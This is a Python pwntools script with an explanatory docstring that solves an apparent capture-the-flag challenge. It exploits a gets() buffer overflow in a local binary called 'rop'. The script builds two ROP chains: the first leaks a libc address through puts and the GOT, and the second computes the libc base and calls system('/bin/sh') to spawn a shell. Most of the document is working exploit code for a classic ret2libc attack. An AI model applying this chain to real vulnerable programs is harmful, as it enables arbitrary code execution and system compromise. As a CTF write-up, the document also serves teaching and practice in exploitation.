'''
Birkan Mert Erenler, 2017.

In this challenge, we are given an x86_64 ELF Linux executable: rop.
Upon executing rop, it prints out a message, and gets user input
with the <gets> function, which is vulnerable to buffer overflow,
since we might input arbitrarily large amount of data to the program.
Thus, we can exploit this vulnerability to pass the challenge.

To be able to get shell, we should use a ROP chain, manipulating 
the saved return address in the stack so that we can jump to arbitrary
places in the memory to run arbitrary commands. To do so, we need to 
use ROP gadgets.

So as to get those gadgets, we can use the tool ROPgadget as
the following:

$ ROPgadget --binary rop

Output of this command gives us many gadgets, but we are interested
in the gadget "pop rdi; ret", since we'd like to leak out an
address in <libc>, and we can use <puts> function which is already
referenced in the binary. The reason we are especially looking for
"pop rdi" instruction is the fact that in x86_64 Linux binaries,
the first argument of a function is passed by the register RDI.
Using the gadget, we can pass a pointer to <puts> so that the
binary prints out whatever we want the pointer to point.

Moreover, after leaking out an address in <libc> (we are leaking
<__libc_start_main>'s address in this exploit), we should calculate
the base address of <libc> so that we can call any function in
<libc>. With this power, we can jump to <system>, with the argument
"/bin/sh", which essentially gives us a shell.

Below is the code for the aforementioned exploit.
'''

from pwn import *

p = process('./rop')
# gdb.attach(p) # Use for debugging purposes

elf = ELF('./rop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # Modify according to your libc version, which you can find with the command "$ ldd rop"

rdi_gadget = 0x4006b3 # "pop rdi; ret" gadget found via "$ ROPgadget --binary rop"

chain1 = 'B' * 0x28 # Fill up the stack and the saved rbp
chain1 += p64(rdi_gadget) + p64(elf.symbols['got.__libc_start_main'])
chain1 += p64(elf.symbols['puts']) # Jump to <puts>, with a pointer to <__libc_start_main> GOT entry so that we leak out a libc address
chain1 += p64(elf.symbols['main']) # Now return <main> to send another ROP chain

p.recvline()
p.sendline(chain1)

libc_offset = p.recvline()[:-1]
libc_offset = u64(libc_offset + '\x00'*(8-len(libc_offset)))
libc.address = libc_offset - libc.symbols['__libc_start_main'] # Calculate the base address of <libc> (wherever it is loaded in the memory)

chain2 = 'B' * 0x28 # Fill up the stack and the saved rbp
chain2 += p64(rdi_gadget) + p64(next(libc.search('/bin/sh'))) # Pass RDI a <libc> address for the string "/bin/sh". Note that <libc> always have this string since it has a functionality to spawn a shell.
chain2 += p64(libc.symbols['system']) # Jump to <system> in <libc>

p.recvline()
p.sendline(chain2)

p.interactive() # Switch to interactive mode for stdin/stdout communication
